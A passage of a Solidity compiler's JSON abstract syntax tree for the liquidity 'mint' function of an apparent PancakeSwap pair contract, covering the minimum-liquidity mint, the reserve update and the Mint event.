														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1457,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5697:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1460,
												"initialValue": {
													"argumentTypes": null,
													"id": 1459,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "5717:11:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5697:31:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1463,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1461,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1458,
														"src": "5820:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1462,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5836:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "5820:17:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 1503,
													"nodeType": "Block",
													"src": "6041:169:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1501,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1485,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1405,
																	"src": "6055:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1493,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1490,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1458,
																						"src": "6105:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1488,
																						"name": "amount0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1437,
																						"src": "6093:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1489,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2298,
																					"src": "6093:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1491,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "6093:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1492,
																				"name": "_reserve0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1408,
																				"src": "6121:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "6093:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1499,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1496,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1458,
																						"src": "6160:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1494,
																						"name": "amount1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1444,
																						"src": "6148:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1495,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2298,
																					"src": "6148:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1497,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "6148:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1498,
																				"name": "_reserve1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1410,
																				"src": "6176:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "6148:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 1486,
																			"name": "Math",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 928,
																			"src": "6067:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																				"typeString": "type(library Math)"
																			}
																		},
																		"id": 1487,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "min",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 873,
																		"src": "6067:8:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1500,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6067:132:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6055:144:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1502,
															"nodeType": "ExpressionStatement",
															"src": "6055:144:6"
														}
													]
												},
												"id": 1504,
												"nodeType": "IfStatement",
												"src": "5816:394:6",
												"trueBody": {
													"id": 1484,
													"nodeType": "Block",
													"src": "5839:196:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1475,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1464,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1405,
																	"src": "5853:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1473,
																			"name": "MINIMUM_LIQUIDITY",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 955,
																			"src": "5901:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1469,
																							"name": "amount1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1444,
																							"src": "5887:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"id": 1467,
																							"name": "amount0",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1437,
																							"src": "5875:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1468,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2298,
																						"src": "5875:11:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1470,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "5875:20:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1465,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "5865:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1466,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "5865:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1471,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "5865:31:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1472,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2270,
																		"src": "5865:35:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1474,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "5865:54:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5853:66:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1476,
															"nodeType": "ExpressionStatement",
															"src": "5853:66:6"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1479,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "5947:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				}
																			],
																			"id": 1478,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "5939:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1480,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "5939:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1481,
																		"name": "MINIMUM_LIQUIDITY",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 955,
																		"src": "5951:17:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1477,
																	"name": "_mint",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 125,
																	"src": "5933:5:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,uint256)"
																	}
																},
																"id": 1482,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "5933:36:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1483,
															"nodeType": "ExpressionStatement",
															"src": "5933:36:6"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1508,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1506,
																"name": "liquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1405,
																"src": "6227:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1507,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6239:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "6227:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
															"id": 1509,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6242:40:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY_MINTED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\""
															}
														],
														"id": 1505,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "6219:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1510,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6219:64:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1511,
												"nodeType": "ExpressionStatement",
												"src": "6219:64:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1513,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1400,
															"src": "6299:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1514,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1405,
															"src": "6303:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1512,
														"name": "_mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 125,
														"src": "6293:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 1515,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6293:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1516,
												"nodeType": "ExpressionStatement",
												"src": "6293:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1518,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1415,
															"src": "6332:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1519,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1426,
															"src": "6342:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1520,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1408,
															"src": "6352:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1521,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1410,
															"src": "6363:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1517,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1286,
														"src": "6324:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1522,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6324:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1523,
												"nodeType": "ExpressionStatement",
												"src": "6324:49:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1524,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1451,
													"src": "6387:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1534,
												"nodeType": "IfStatement",
												"src": "6383:47:6",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1532,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1525,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 984,
															"src": "6394:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1530,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "6421:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1527,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 974,
																			"src": "6407:8:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1526,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "6402:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1528,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6402:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1529,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2298,
																"src": "6402:18:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1531,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6402:28:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "6394:36:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1533,
													"nodeType": "ExpressionStatement",
													"src": "6394:36:6"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1536,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "6490:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1537,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "6490:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1538,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1437,
															"src": "6502:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1539,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1444,
															"src": "6511:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1535,
														"name": "Mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1104
														],
														"referencedDeclaration": 1104,
														"src": "6485:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256,uint256)"
														}
													},
													"id": 1540,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6485:34:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1541,
												"nodeType": "EmitStatement",
												"src": "6480:39:6"
											}
										]
									},
									"documentation": null,
									"id": 1543,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1403,
											"modifierName": {
												"argumentTypes": null,
												"id": 1402,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1008,
												"src": "5296:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "5296:4:6"
										}
									],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1401,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1400,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1543,
												"src": "5275:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1399,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5275:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5274:12:6"
									},
									"returnParameters": {
										"id": 1406,
